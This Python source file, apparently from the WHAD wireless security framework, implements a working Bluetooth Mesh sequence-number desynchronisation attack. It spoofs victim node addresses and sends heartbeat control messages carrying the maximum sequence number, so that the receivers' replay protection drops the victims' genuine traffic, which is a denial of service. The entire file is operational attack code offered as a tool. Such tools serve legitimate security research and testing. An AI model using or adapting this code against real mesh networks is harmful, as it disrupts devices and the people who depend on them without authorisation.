"""
Attacker object for the Bluetooth Mesh sequence number desychronization attack
"""

import logging

from dataclasses import dataclass, field
from whad.btmesh.attacker import Attacker
from whad.scapy.layers.btmesh import BTMesh_Upper_Transport_Control_Heartbeat
from whad.btmesh.stack.utils import MeshMessageContext

from whad.scapy.layers.btmesh import (
    EIR_PB_ADV_PDU,
    BTMesh_Generic_Provisioning_Link_Close,
    BTMesh_Generic_Provisioning_Hdr,
    EIR_Hdr,
)

from time import sleep
from random import uniform
from threading import Thread

logger = logging.getLogger(__name__)


@dataclass
class SeqNumDesynchConfiguration:
    """Configuration for an the SeqNumDesynch attack

    :param victims: The victims of the attacks, .i.e the spoofed source addresses.
    :param targets: The target(s) of the messages, .i.e. the destinations of the messages.
    :param seq_num: The sequence number to use in the messages.
    :param net_key_index: The index of the net_key to use to perform the attack.
    """

    victims: list[int] = field(default_factory=lambda: [0x0005, 0x0006])
    targets: list[int] = field(default_factory=lambda: [0xFFFF])
    seq_num: int = 0xFFFFFF
    net_key_index: int = 0


class SeqNumDesynchAttacker(Attacker):

    name = "SeqNumDesynchAttack"
    description = "Leverages the RPL of nodes by sending spoofed messages with a very high sequence number to create DoS."
    need_provisioned_node = True

    def __init__(self, connector, configuration=SeqNumDesynchConfiguration()):
        """SeqNumDesynch Attack object. Needs a provisionned node.

        :param connector: The btmesh connector to use
        :type connector: BTMesh
        :param configuration: The configuration to use
        :type configuration: LinkCloserConfiguration
        """

        super().__init__(connector, configuration)

    def _setup(self):
        """
        In order to not receive our own messages, we disable the receiving of the node.
        """
        self._connector.stop()
        self._is_setup = True

    def restore(self):
        """
        Renable receiving of this node.
        """
        self._connector.start()
        self._is_setup = False

    def _attack_runner(self):
        self.event.set()
        self._is_attack_running = True

        # Check validity of parameters
        if (
            self._configuration.victims == []
            or self._configuration.targets == []
            or self._connector.profile.get_net_key(self._configuration.net_key_index)
            is None
        ):
            self._success = False
            self.is_attack_running = False
            return

        upper_transport_layer = self._connector.main_stack.get_layer("upper_transport")

        # For each vicitim and target, send message with specified sequence number
        for victim in self._configuration.victims:
            for target in self._configuration.targets:

                if not self.event.is_set():
                    return

                ctx = MeshMessageContext()
                ctx.src_addr = victim
                ctx.dest_addr = target
                ctx.seq_number = self._configuration.seq_num
                ctx.net_key_id = self._configuration.net_key_index
                ctx.ttl = 127
                ctx.is_ctl = True
                pkt = BTMesh_Upper_Transport_Control_Heartbeat(init_ttl=127, features=0)
                upper_transport_layer.send_control_message((pkt, ctx))
                sleep(0.01)

        self._success = True
        self._is_attack_running = False

    def launch(self, asynch=False):
        """
        Launches the SeqNumDesynch attack. Synch is advised

        :param asynch [TODO:type]: [TODO:description]
        """
        super().launch(asynch=asynch)

    def show_result(self):
        """Function implemented in each Attacker to display the result of the attack"""
        if self._success:
            print(
                "Attack performed, nothing to display. Try sending a message from victim to targets."
            )
        else:
            print(
                "Attack not launched yet or failed (empty victim/target lists, net_key doesnt exist ?)."
            )
